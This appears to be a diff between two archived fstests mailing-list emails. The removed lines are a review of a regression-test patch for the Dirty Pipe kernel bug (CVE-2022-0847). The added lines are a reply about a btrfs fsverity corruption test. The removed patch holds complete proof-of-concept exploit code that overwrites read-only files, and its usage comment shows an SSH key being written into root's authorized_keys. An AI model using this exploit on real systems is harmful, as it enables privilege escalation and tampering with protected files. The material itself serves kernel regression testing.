@@ -2,337 +2,323 @@ Return-Path: <fstests-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 47196C433EF
-	for <linux-fstests@archiver.kernel.org>; Mon, 11 Apr 2022 20:34:17 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 246CBC433FE
+	for <linux-fstests@archiver.kernel.org>; Mon, 11 Apr 2022 21:22:15 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S238258AbiDKUga (ORCPT
+        id S1350114AbiDKVY1 (ORCPT
         <rfc822;linux-fstests@archiver.kernel.org>);
-        Mon, 11 Apr 2022 16:36:30 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:57492 "EHLO
+        Mon, 11 Apr 2022 17:24:27 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34754 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S233848AbiDKUg3 (ORCPT
-        <rfc822;fstests@vger.kernel.org>); Mon, 11 Apr 2022 16:36:29 -0400
-Received: from ams.source.kernel.org (ams.source.kernel.org [IPv6:2604:1380:4601:e00::1])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 17AE462D2
-        for <fstests@vger.kernel.org>; Mon, 11 Apr 2022 13:34:12 -0700 (PDT)
-Received: from smtp.kernel.org (relay.kernel.org [52.25.139.140])
-        (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-        (No client certificate requested)
-        by ams.source.kernel.org (Postfix) with ESMTPS id 61369B818B8
-        for <fstests@vger.kernel.org>; Mon, 11 Apr 2022 20:34:11 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id DB1C6C385A4;
-        Mon, 11 Apr 2022 20:34:09 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-        s=k20201202; t=1649709249;
-        bh=LQSgP/dzjnp1Z9XtwTzouSfpB4QtDmPj9xxYOp6mmP0=;
-        h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-        b=EPvGuUhpmyICQMSVIYiDmi7AjvI0I3PqqMvzWAwmRBamuFVznPEJ2WwmXSHFHwJwl
-         +bfNcba/h3rAu2CMnppflapVoLkN6X7maWry6/C8TokZT761wqkkgM39Y07opOpK5w
-         gnu15dSaJk8Frw5XW6SQYYC+Oc/3rHXwi3w6f+lD9o3yBRKYeP7GyGlcGlRqoYdhYn
-         ouoykTDwjvyswBC8jrHl4frgjEP9llOTKmIJCEr0PvntR49LTyG/Pf9HaEAoWFo9Lw
-         JiNaXMpdXPKF6ZSnrdrPx72i3WitxiCK2kEllBagesCuXnRmsvue179Pk8v0O8pz1s
-         KYnEjnWD9+nHw==
-Date:   Mon, 11 Apr 2022 13:34:09 -0700
-From:   "Darrick J. Wong" <djwong@kernel.org>
-To:     Zorro Lang <zlang@redhat.com>
-Cc:     fstests@vger.kernel.org, guan@eryu.me
-Subject: Re: [PATCH v3 2/2] fstests: test dirty pipe vulnerability issue of
- CVE-2022-0847
-Message-ID: <20220411203409.GA16774@magnolia>
-References: <20220411163710.2157888-1-zlang@redhat.com>
- <20220411163710.2157888-3-zlang@redhat.com>
+        with ESMTP id S1350175AbiDKVYW (ORCPT
+        <rfc822;fstests@vger.kernel.org>); Mon, 11 Apr 2022 17:24:22 -0400
+Received: from wnew2-smtp.messagingengine.com (wnew2-smtp.messagingengine.com [64.147.123.27])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 935CB2FE5F;
+        Mon, 11 Apr 2022 14:22:06 -0700 (PDT)
+Received: from compute3.internal (compute3.nyi.internal [10.202.2.43])
+        by mailnew.west.internal (Postfix) with ESMTP id EC1092B058DC;
+        Mon, 11 Apr 2022 17:22:03 -0400 (EDT)
+Received: from mailfrontend1 ([10.202.2.162])
+  by compute3.internal (MEProxy); Mon, 11 Apr 2022 17:22:04 -0400
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=bur.io; h=cc:cc
+        :content-type:date:date:from:from:in-reply-to:in-reply-to
+        :message-id:mime-version:references:reply-to:sender:subject
+        :subject:to:to; s=fm1; t=1649712123; x=1649719323; bh=2UBvxibiji
+        Nc6mEU2Um9w09RD9B1BVWz0C4/ZTIFj2s=; b=QH/W/+cdzESzYc1TS+/S2SZBmo
+        jlxgYm6Hp8JZvbfMzN8AATduOAiQP4L8cmBClZ6DBz3WMd+8UpK6h17OJX0SPUq8
+        5yQypt2Rai6MW2p4TDHZyeF9ABXgS2okE71rlsiNRAfFfV+sXndH6LBlG/jSBSuU
+        gXBXlYIIuVs4/Y96B1eNLd6yKjSMmkw+45BdfbmRTtOfCppOiJMi/2Cc4DuPNCoH
+        Vt4+flSppMPYwMsBH9HOIr4csHhkDtvWDZq4XyGPVt36yhfvVO5qbsjlukC3clr4
+        trb+6op9CEeU2SR4LDL5xb75sNbaccF5MF1/ovivqOilZWhWY95zRfRgL2Ew==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+        messagingengine.com; h=cc:cc:content-type:date:date:from:from
+        :in-reply-to:in-reply-to:message-id:mime-version:references
+        :reply-to:sender:subject:subject:to:to:x-me-proxy:x-me-proxy
+        :x-me-sender:x-me-sender:x-sasl-enc; s=fm3; t=1649712123; x=
+        1649719323; bh=2UBvxibijiNc6mEU2Um9w09RD9B1BVWz0C4/ZTIFj2s=; b=g
+        9zu83lazfaV+e4hlKs7jhHYg6ocR38WgMPvSyw9uLiV8pXn20CApM06/fqDCgM6p
+        8L/W7UPz0uyYzuJCzPhfTSVvoS22o5kWiuYrRvUBbp0uKf44BpWGoRAGL2UXOHsY
+        3CDaclKXDiKnykpQybz1LD45PDx4OxGUJPcpbQJtMcSn0nPHmey45d1JO4q9PcMX
+        D0kf/5o4/FUQQ4QbCsTeyfiKiBTAOzfoMUODOTHn51u9bICBIYFdbA64BuiYi9vj
+        gJvqD8e1msY2LVbTh7FT7XeaoatbCq+H7UCCC6b2h7LPnSMBdC9hSiSJoDD/qr8G
+        z0RxwG9r3m/dqCweO1QFA==
+X-ME-Sender: <xms:-5tUYizQo2N-ZUxsQkbkfvJeq8FvfgqeGKUKP7SUglswbiRJTc3eZQ>
+    <xme:-5tUYuRGTfLBptn1IycU-AfMY14tLH3QGG9ZjqYC33n6dyzWovpfJxdl-UfSFXxEd
+    D1ztYJwFKWHrLHT4qw>
+X-ME-Received: <xmr:-5tUYkVfKKJfcztt21JzvJYcP7O5pVTo-CKY4rdUXYyCISjccjWLa4mrhDMb3Xtutgixnjto5RRXIyWAfbYdjREifzuvng>
+X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvvddrudekiedgudeivdcutefuodetggdotefrod
+    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpqfgfvfdpuffrtefokffrpgfnqfgh
+    necuuegrihhlohhuthemuceftddtnecusecvtfgvtghiphhivghnthhsucdlqddutddtmd
+    enucfjughrpeffhffvuffkfhggtggujgesthdtredttddtvdenucfhrhhomhepuehorhhi
+    shcuuehurhhkohhvuceosghorhhishessghurhdrihhoqeenucggtffrrghtthgvrhhnpe
+    ehudevleekieetleevieeuhfduhedtiefgheekfeefgeelvdeuveeggfduueevfeenucev
+    lhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpegsohhrihhsse
+    gsuhhrrdhioh
+X-ME-Proxy: <xmx:-5tUYoj6Rz8QhDRTbYaRh-XkMZ-av6uGlFX_ZvnLHyfhhPQ0_Gkmvg>
+    <xmx:-5tUYkCgX75vNHvyfUBZhk3uHlmFhq5gbx5O4zC8a5oP226ZA-CG6g>
+    <xmx:-5tUYpJXl7QEkpNFwS_PEbci5EOeKgGr541Nx0rVE9wXPgNk7bPR9w>
+    <xmx:-5tUYnNdqIJ0JTQEr3HOTemdQwbnlZyQ1N7zWxy9CLrhLLcB5DqW4UoHJwo>
+Received: by mail.messagingengine.com (Postfix) with ESMTPA; Mon,
+ 11 Apr 2022 17:22:02 -0400 (EDT)
+Date:   Mon, 11 Apr 2022 14:22:40 -0700
+From:   Boris Burkov <boris@bur.io>
+To:     Eryu Guan <guan@eryu.me>
+Cc:     fstests@vger.kernel.org, linux-fscrypt@vger.kernel.org,
+        linux-btrfs@vger.kernel.org, kernel-team@fb.com
+Subject: Re: [PATCH v8 3/5] btrfs: test btrfs specific fsverity corruption
+Message-ID: <YlScIOwQIrxutaE/@zen>
+References: <cover.1647461985.git.boris@bur.io>
+ <fd69c62b9971d446f53ba3d168625fb3a3468882.1647461985.git.boris@bur.io>
+ <YlLvUCWvx3fK2ocg@desktop>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-In-Reply-To: <20220411163710.2157888-3-zlang@redhat.com>
+In-Reply-To: <YlLvUCWvx3fK2ocg@desktop>
 Precedence: bulk
 List-ID: <fstests.vger.kernel.org>
 X-Mailing-List: fstests@vger.kernel.org
 
-On Tue, Apr 12, 2022 at 12:37:10AM +0800, Zorro Lang wrote:
-> Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
-> uninitialized  "pipe_buffer.flags" variable. The bug cause a file
-> can be overwritten even if a user/process is not permitted to write
-> it. It's fixed by 9d2231c5d74e ("lib/iov_iter: initialize "flags" in
-> new pipe_buffer").
+On Sun, Apr 10, 2022 at 10:53:04PM +0800, Eryu Guan wrote:
+> On Wed, Mar 16, 2022 at 01:25:13PM -0700, Boris Burkov wrote:
+> > There are some btrfs specific fsverity scenarios that don't map
+> > neatly onto the tests in generic/574 like holes, inline extents,
+> > and preallocated extents. Cover those in a btrfs specific test.
+> > 
+> > This test relies on the btrfs implementation of fsverity in the patch:
+> > btrfs: initial fsverity support
+> > 
+> > and on btrfs-corrupt-block for corruption in the patches titled:
+> > btrfs-progs: corrupt generic item data with btrfs-corrupt-block
+> > btrfs-progs: expand corrupt_file_extent in btrfs-corrupt-block
+> > 
+> > Signed-off-by: Boris Burkov <boris@bur.io>
+> > ---
+> >  tests/btrfs/290     | 168 ++++++++++++++++++++++++++++++++++++++++++++
+> >  tests/btrfs/290.out |  25 +++++++
+> >  2 files changed, 193 insertions(+)
+> >  create mode 100755 tests/btrfs/290
+> >  create mode 100644 tests/btrfs/290.out
+> > 
+> > diff --git a/tests/btrfs/290 b/tests/btrfs/290
+> > new file mode 100755
+> > index 00000000..f9acd55a
+> > --- /dev/null
+> > +++ b/tests/btrfs/290
+> > @@ -0,0 +1,168 @@
+> > +#! /bin/bash
+> > +# SPDX-License-Identifier: GPL-2.0
+> > +# Copyright (C) 2021 Facebook, Inc. All Rights Reserved.
 > 
-> Cc: Max Kellermann <max.kellermann@ionos.com>
-> Signed-off-by: Zorro Lang <zlang@redhat.com>
+> I noticed that all patches have 2021 in copyright statement, should be
+> updated to 2022?
 
-Still looks ok...
-Reviewed-by: Darrick J. Wong <djwong@kernel.org>
+Oops, good catch. I will resend with the right copyright statement along
+with any changes from review on the btrfs tests.
 
---D
+Thanks for taking a look,
+Boris
 
-> ---
->  .gitignore            |   1 +
->  src/Makefile          |   2 +-
->  src/splice2pipe.c     | 158 ++++++++++++++++++++++++++++++++++++++++++
->  tests/generic/999     |  48 +++++++++++++
->  tests/generic/999.out |   9 +++
->  5 files changed, 217 insertions(+), 1 deletion(-)
->  create mode 100644 src/splice2pipe.c
->  create mode 100755 tests/generic/999
->  create mode 100644 tests/generic/999.out
 > 
-> diff --git a/.gitignore b/.gitignore
-> index 11405bd2..5f24909e 100644
-> --- a/.gitignore
-> +++ b/.gitignore
-> @@ -125,6 +125,7 @@ tags
->  /src/runas
->  /src/seek_copy_test
->  /src/seek_sanity_test
-> +/src/splice2pipe
->  /src/splice-test
->  /src/stale_handle
->  /src/stat_test
-> diff --git a/src/Makefile b/src/Makefile
-> index 88877ac9..24aef09b 100644
-> --- a/src/Makefile
-> +++ b/src/Makefile
-> @@ -31,7 +31,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
->  	dio-invalidate-cache stat_test t_encrypted_d_revalidate \
->  	attr_replace_test swapon mkswap t_attr_corruption t_open_tmpfiles \
->  	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
-> -	detached_mounts_propagation ext4_resize t_readdir_3
-> +	detached_mounts_propagation ext4_resize t_readdir_3 splice2pipe
->  
->  EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
->  	      btrfs_crc32c_forged_name.py
-> diff --git a/src/splice2pipe.c b/src/splice2pipe.c
-> new file mode 100644
-> index 00000000..bd33ff67
-> --- /dev/null
-> +++ b/src/splice2pipe.c
-> @@ -0,0 +1,158 @@
-> +/* SPDX-License-Identifier: GPL-2.0 */
-> +/*
-> + * Copyright 2022 CM4all GmbH / IONOS SE
-> + *
-> + * author: Max Kellermann <max.kellermann@ionos.com>
-> + *
-> + * Proof-of-concept exploit for the Dirty Pipe
-> + * vulnerability (CVE-2022-0847) caused by an uninitialized
-> + * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
-> + * file contents in the page cache, even if the file is not permitted
-> + * to be written, immutable or on a read-only mount.
-> + *
-> + * This exploit requires Linux 5.8 or later; the code path was made
-> + * reachable by commit f6dd975583bd ("pipe: merge
-> + * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
-> + * there before, it just provided an easy way to exploit it.
-> + *
-> + * There are two major limitations of this exploit: the offset cannot
-> + * be on a page boundary (it needs to write one byte before the offset
-> + * to add a reference to this page to the pipe), and the write cannot
-> + * cross a page boundary.
-> + *
-> + * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
-> + *
-> + * Further explanation: https://dirtypipe.cm4all.com/
-> + */
-> +#ifndef _GNU_SOURCE
-> +#define _GNU_SOURCE
-> +#endif
-> +#include <unistd.h>
-> +#include <fcntl.h>
-> +#include <stdio.h>
-> +#include <stdlib.h>
-> +#include <string.h>
-> +#include <sys/stat.h>
-> +#include <sys/user.h>
-> +
-> +/**
-> + * Create a pipe where all "bufs" on the pipe_inode_info ring have the
-> + * PIPE_BUF_FLAG_CAN_MERGE flag set.
-> + */
-> +static void prepare_pipe(int p[2])
-> +{
-> +	if (pipe(p)) {
-> +		perror("pipe failed");
-> +		abort();
-> +        }
-> +
-> +	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
-> +	static char buffer[4096];
-> +
-> +	/* fill the pipe completely; each pipe_buffer will now have
-> +	   the PIPE_BUF_FLAG_CAN_MERGE flag */
-> +	for (unsigned r = pipe_size; r > 0;) {
-> +		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
-> +		write(p[1], buffer, n);
-> +		r -= n;
-> +	}
-> +
-> +	/* drain the pipe, freeing all pipe_buffer instances (but
-> +	   leaving the flags initialized) */
-> +	for (unsigned r = pipe_size; r > 0;) {
-> +		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
-> +		read(p[0], buffer, n);
-> +		r -= n;
-> +	}
-> +
-> +	/* the pipe is now empty, and if somebody adds a new
-> +	   pipe_buffer without initializing its "flags", the buffer
-> +	   will be mergeable */
-> +}
-> +
-> +int main(int argc, char **argv)
-> +{
-> +	if (argc != 4) {
-> +		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	/* dumb command-line argument parser */
-> +	const char *const path = argv[1];
-> +	loff_t offset = strtoul(argv[2], NULL, 0);
-> +	const char *const data = argv[3];
-> +	const size_t data_size = strlen(data);
-> +	int page_size = sysconf(_SC_PAGESIZE);
-> +	if (page_size == -1)
-> +		page_size = 4096;
-> +
-> +	if (offset % page_size == 0) {
-> +		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	const loff_t next_page = (offset | (page_size - 1)) + 1;
-> +	const loff_t end_offset = offset + (loff_t)data_size;
-> +	if (end_offset > next_page) {
-> +		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	/* open the input file and validate the specified offset */
-> +	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
-> +	if (fd < 0) {
-> +		perror("open failed");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	struct stat st;
-> +	if (fstat(fd, &st)) {
-> +		perror("stat failed");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	if (offset > st.st_size) {
-> +		fprintf(stderr, "Offset is not inside the file\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	if (end_offset > st.st_size) {
-> +		fprintf(stderr, "Sorry, cannot enlarge the file\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	/* create the pipe with all flags initialized with
-> +	   PIPE_BUF_FLAG_CAN_MERGE */
-> +	int p[2];
-> +	prepare_pipe(p);
-> +
-> +	/* splice one byte from before the specified offset into the
-> +	   pipe; this will add a reference to the page cache, but
-> +	   since copy_page_to_iter_pipe() does not initialize the
-> +	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
-> +	--offset;
-> +	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
-> +	if (nbytes < 0) {
-> +		perror("splice failed");
-> +		return EXIT_FAILURE;
-> +	}
-> +	if (nbytes == 0) {
-> +		fprintf(stderr, "short splice\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	/* the following write will not create a new pipe_buffer, but
-> +	   will instead write into the page cache, because of the
-> +	   PIPE_BUF_FLAG_CAN_MERGE flag */
-> +	nbytes = write(p[1], data, data_size);
-> +	if (nbytes < 0) {
-> +		perror("write failed");
-> +		return EXIT_FAILURE;
-> +	}
-> +	if ((size_t)nbytes < data_size) {
-> +		fprintf(stderr, "short write\n");
-> +		return EXIT_FAILURE;
-> +	}
-> +
-> +	return EXIT_SUCCESS;
-> +}
-> diff --git a/tests/generic/999 b/tests/generic/999
-> new file mode 100755
-> index 00000000..111dde06
-> --- /dev/null
-> +++ b/tests/generic/999
-> @@ -0,0 +1,48 @@
-> +#! /bin/bash
-> +# SPDX-License-Identifier: GPL-2.0
-> +# Copyright (c) 2022 Red Hat, Inc.  All Rights Reserved.
-> +#
-> +# FS QA Test No. 999
-> +#
-> +# Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
-> +# uninitialized  "pipe_buffer.flags" variable, which fixed by:
-> +#   9d2231c5d74e ("lib/iov_iter: initialize "flags" in new pipe_buffer")
-> +#
-> +. ./common/preamble
-> +_begin_fstest auto quick
-> +
-> +# real QA test starts here
-> +_supported_fs generic
-> +_require_test
-> +_require_user
-> +_require_chmod
-> +_require_test_program "splice2pipe"
-> +
-> +localfile=$TEST_DIR/testfile.$seq
-> +rm -f $localfile
-> +
-> +# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
-> +# permission on it
-> +$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
-> +chmod 0644 $localfile
-> +# Test privileged user (xfstests generally run with root)
-> +echo "Test privileged user:"
-> +$here/src/splice2pipe $localfile 1 "AAAAAAAABBBBBBBB"
-> +# Part of 0xff will be overwritten if there's CVE-2022-0847 bug
-> +_hexdump $localfile
-> +
-> +# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
-> +# permission on it
-> +$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
-> +chmod 0644 $localfile
-> +# Copy splice2pipe to a place which can be run by an unprivileged user (avoid
-> +# something likes /root/xfstests/src/splice2pipe)
-> +cp $here/src/splice2pipe $tmp.splice2pipe
-> +# Test unprivileged user's privilege escalation
-> +echo "Test unprivileged user:"
-> +su ${qa_user} -c "$tmp.splice2pipe $localfile 1 AAAAAAAABBBBBBBB"
-> +_hexdump $localfile
-> +
-> +# success, all done
-> +status=0
-> +exit
-> diff --git a/tests/generic/999.out b/tests/generic/999.out
-> new file mode 100644
-> index 00000000..a142909b
-> --- /dev/null
-> +++ b/tests/generic/999.out
-> @@ -0,0 +1,9 @@
-> +QA output created by 999
-> +Test privileged user:
-> +000000 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff  >................<
-> +*
-> +001000
-> +Test unprivileged user:
-> +000000 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff  >................<
-> +*
-> +001000
-> -- 
-> 2.31.1
+> And I'd like btrfs folks to help review these 2 btrfs specific tests.
 > 
+> Thanks,
+> Eryu
+> 
+> > +#
+> > +# FS QA Test 290
+> > +#
+> > +# Test btrfs support for fsverity.
+> > +# This test extends the generic fsverity testing by corrupting inline extents,
+> > +# preallocated extents, holes, and the Merkle descriptor in a btrfs-aware way.
+> > +#
+> > +. ./common/preamble
+> > +_begin_fstest auto quick verity
+> > +
+> > +# Import common functions.
+> > +. ./common/filter
+> > +. ./common/verity
+> > +
+> > +# real QA test starts here
+> > +_supported_fs btrfs
+> > +_require_scratch_verity
+> > +_require_scratch_nocheck
+> > +_require_odirect
+> > +_require_xfs_io_command "falloc"
+> > +_require_xfs_io_command "pread"
+> > +_require_xfs_io_command "pwrite"
+> > +_require_btrfs_corrupt_block
+> > +
+> > +get_ino() {
+> > +	local file=$1
+> > +	stat -c "%i" $file
+> > +}
+> > +
+> > +validate() {
+> > +	local f=$1
+> > +	local sz=$(_get_filesize $f)
+> > +	# buffered io
+> > +	echo $(basename $f)
+> > +	$XFS_IO_PROG -rc "pread -q 0 $sz" $f 2>&1 | _filter_scratch
+> > +	# direct io
+> > +	$XFS_IO_PROG -rdc "pread -q 0 $sz" $f 2>&1 | _filter_scratch
+> > +}
+> > +
+> > +# corrupt the data portion of an inline extent
+> > +corrupt_inline() {
+> > +	local f=$SCRATCH_MNT/inl
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 42" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# inline data starts at disk_bytenr
+> > +	# overwrite the first u64 with random bogus junk
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -i $ino -x 0 -f disk_bytenr $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# preallocate a file, then corrupt it by changing it to a regular file
+> > +corrupt_prealloc_to_reg() {
+> > +	local f=$SCRATCH_MNT/prealloc
+> > +	$XFS_IO_PROG -fc "falloc 0 12k" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# set extent type from prealloc (2) to reg (1)
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -i $ino -x 0 -f type -v 1 $SCRATCH_DEV >/dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# corrupt a regular file by changing the type to preallocated
+> > +corrupt_reg_to_prealloc() {
+> > +	local f=$SCRATCH_MNT/reg
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# set type from reg (1) to prealloc (2)
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -i $ino -x 0 -f type -v 2 $SCRATCH_DEV >/dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# corrupt a file by punching a hole
+> > +corrupt_punch_hole() {
+> > +	local f=$SCRATCH_MNT/punch
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	# make a new extent in the middle, sync so the writes don't coalesce
+> > +	$XFS_IO_PROG -c sync $SCRATCH_MNT
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x59 4096 4096" $f
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# change disk_bytenr to 0, representing a hole
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -i $ino -x 4096 -f disk_bytenr -v 0 $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# plug hole
+> > +corrupt_plug_hole() {
+> > +	local f=$SCRATCH_MNT/plug
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	$XFS_IO_PROG -fc "falloc 4k 4k" $f
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# change disk_bytenr to some value, plugging the hole
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -i $ino -x 4096 -f disk_bytenr -v 13639680 $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# corrupt the fsverity descriptor item indiscriminately (causes EINVAL)
+> > +corrupt_verity_descriptor() {
+> > +	local f=$SCRATCH_MNT/desc
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# key for the descriptor item is <inode, BTRFS_VERITY_DESC_ITEM_KEY, 1>,
+> > +	# 88 is X. So we write 5 Xs to the start of the descriptor
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -r 5 -I $ino,36,1 -v 88 -o 0 -b 5 $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# specifically target the root hash in the descriptor (causes EIO)
+> > +corrupt_root_hash() {
+> > +	local f=$SCRATCH_MNT/roothash
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -r 5 -I $ino,36,1 -v 88 -o 16 -b 1 $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# corrupt the Merkle tree data itself
+> > +corrupt_merkle_tree() {
+> > +	local f=$SCRATCH_MNT/merkle
+> > +	$XFS_IO_PROG -fc "pwrite -q -S 0x58 0 12288" $f
+> > +	local ino=$(get_ino $f)
+> > +	_fsv_enable $f
+> > +	_scratch_unmount
+> > +	# key for the descriptor item is <inode, BTRFS_VERITY_MERKLE_ITEM_KEY, 0>,
+> > +	# 88 is X. So we write 5 Xs to somewhere in the middle of the first
+> > +	# merkle item
+> > +	$BTRFS_CORRUPT_BLOCK_PROG -r 5 -I $ino,37,0 -v 88 -o 100 -b 5 $SCRATCH_DEV > /dev/null 2>&1
+> > +	_scratch_mount
+> > +	validate $f
+> > +}
+> > +
+> > +# real QA test starts here
+> > +_scratch_mkfs >/dev/null
+> > +_scratch_mount
+> > +
+> > +corrupt_inline
+> > +corrupt_prealloc_to_reg
+> > +corrupt_reg_to_prealloc
+> > +corrupt_punch_hole
+> > +corrupt_plug_hole
+> > +corrupt_verity_descriptor
+> > +corrupt_root_hash
+> > +corrupt_merkle_tree
+> > +
+> > +status=0
+> > +exit
+> > diff --git a/tests/btrfs/290.out b/tests/btrfs/290.out
+> > new file mode 100644
+> > index 00000000..056b114b
+> > --- /dev/null
+> > +++ b/tests/btrfs/290.out
+> > @@ -0,0 +1,25 @@
+> > +QA output created by 290
+> > +inl
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +prealloc
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +reg
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +punch
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +plug
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +desc
+> > +SCRATCH_MNT/desc: Invalid argument
+> > +SCRATCH_MNT/desc: Invalid argument
+> > +roothash
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > +merkle
+> > +pread: Input/output error
+> > +pread: Input/output error
+> > -- 
+> > 2.31.0
